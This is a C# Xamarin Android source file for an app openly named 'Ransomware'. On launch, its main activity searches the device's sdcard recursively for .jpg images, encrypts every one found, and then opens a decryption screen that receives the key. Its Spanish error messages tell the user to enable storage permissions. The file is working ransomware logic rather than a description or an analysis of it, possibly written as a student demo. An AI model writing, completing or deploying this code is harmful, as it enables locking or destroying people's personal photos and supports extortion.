using Android.App;
using Android.OS;
using Android.Support.V7.App;
using System.IO;
using AlertDialog = Android.Support.V7.App.AlertDialog;
using Ransomware.EncryptFiles;
using Android.Content;

namespace Ransomware
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme", MainLauncher = true, NoHistory =true)]
    public class MainActivity : AppCompatActivity
    {
        string[] files;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            // Set our view from the "main" layout resource
            SetContentView(Resource.Layout.activity_main);
            try
            {
                files = SearchFiles();

                string key = Encrypt.CreateKey();
                if (files == null | files.Length < 1)
                {
                    AlertDialog.Builder alert = new AlertDialog.Builder(this);
                    alert.SetTitle("ERROR");
                    alert.SetMessage("ERROR: No hay archivos que encriptar");
                    alert.SetNegativeButton("Cancel", (senderAlert, args) =>
                    {
                        Intent dec = new Intent(this, typeof(decrypt_act));
                        dec.PutExtra("code", "");
                        StartActivity(dec);
                    });

                    Dialog dialog = alert.Create();
                    dialog.Show();

                }

                    foreach (var f in files)
                    {
                            Encrypt.EncryptFile(f);
                    }
                    Intent decActivity = new Intent(this, typeof(decrypt_act));
                    decActivity.PutExtra("code", key);
                    StartActivity(decActivity);
                
            }
            catch
            {
                AlertDialog.Builder alert = new AlertDialog.Builder(this);
                alert.SetTitle("ERROR");
                alert.SetMessage("ERROR: Necesitas habilitar los permisos para utilizar la aplicacion. Configuracion/Aplicaciones/Ransomware/Permisos");
                alert.SetNegativeButton("Cancel", (senderAlert, args) =>
                {
                    Finish();
                });

                Dialog dialog = alert.Create();
                dialog.Show();
            }
            

        }

        public string[] SearchFiles()
        {
            string[] files = Directory.GetFiles(@"sdcard", "*.jpg", SearchOption.AllDirectories);
            return files;
        }
    }
}